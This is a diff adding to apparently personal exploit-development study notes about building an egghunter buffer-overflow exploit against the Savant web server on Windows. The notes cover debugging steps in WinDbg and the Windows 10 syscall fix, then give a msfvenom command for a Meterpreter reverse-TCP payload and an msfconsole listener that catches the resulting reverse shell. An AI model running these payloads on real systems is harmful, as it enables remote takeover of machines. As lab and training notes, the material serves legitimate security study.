@@ -136,3 +136,31 @@ After producing shellcode with one of these tools, it can be verified with msf-n
 ### Egghunter Example
 `NTAccessCheckAndAuditAlarms` : a Windows system call that we abuse to check for access violations and handle cleanly using native Windows kernel methods. Returns either `STATUS_ACCESS_VIOLATION` if invalid or `STATUS_NO_IMPERSONATION_TOKEN` if valid
 [[Egghunter Example]]
+1. Edit the egghunter example to include out custom egg
+2. Run the script to get the opcodes and insert into our exploit script. It fits after the HTTP request, where we set our conditional jump to. Prepend the script with nops to mitigate imprecisions.
+3. Set a breakpoint on the EIP jump address, then step through to ensure that the egghunter code wasn't mangled
+4. `s -a 0x0 L?80000000 "BabuBabu"` to ensure the egg and buffer are in memory, then set a breakpoint on the last instruction (the `jmp edi`) to signify when the egghunter is done.
+5. `g` to let code run, but the breakpoint is never hit... We also see that Savant CPU usage is very high, meaning its still searching
+Some research shows that this code is primarily a Windows 7 exploit, signifying that something changed between Windows 7 and Windows 10 that causes this exploit to fail...
+
+
+### Debugging the Egghunter
+Syscall number changes in Windows 10, and changes in every version
+Can't just add it, there are null bytes
+Need to move in the Two's Compliment (calculated via WinDbg) then negate it `neg eax`
+Edit script egghunter
+Run and add a breakpoint at the `jmp edi`, we see that it finds the egg in memory
+
+### Egghunter Shellcode
+Remember that this is a new buffer and so we need to check again for bad characters.
+Since our exploit is stable without the shellcode section, we can send all the potential badchars at once (as it won't break the exploit), then dump that region of memory in WinDbg by searching for the egg. 
+1. Insert string of all chars into script.
+2. `db EGG_ADDRESS+8 L100` : assuming egg length of 8 chars, and L100 being 256 (16x16) in hex for all the entered chars. 
+	   It seems like all the chars came in good.
+3. Generate shellcode `msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=8005 -f python -v shellcode` : where v is the variable name to be set in python and put it in the script
+4. Run a listener `msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.119.120; set LPORT 443; exploit"`
+5. Run Savant without the debugger, then throw the exploit script
+6. Boom, reverse shell
+
+### Shellcode Portability
+... to be continued
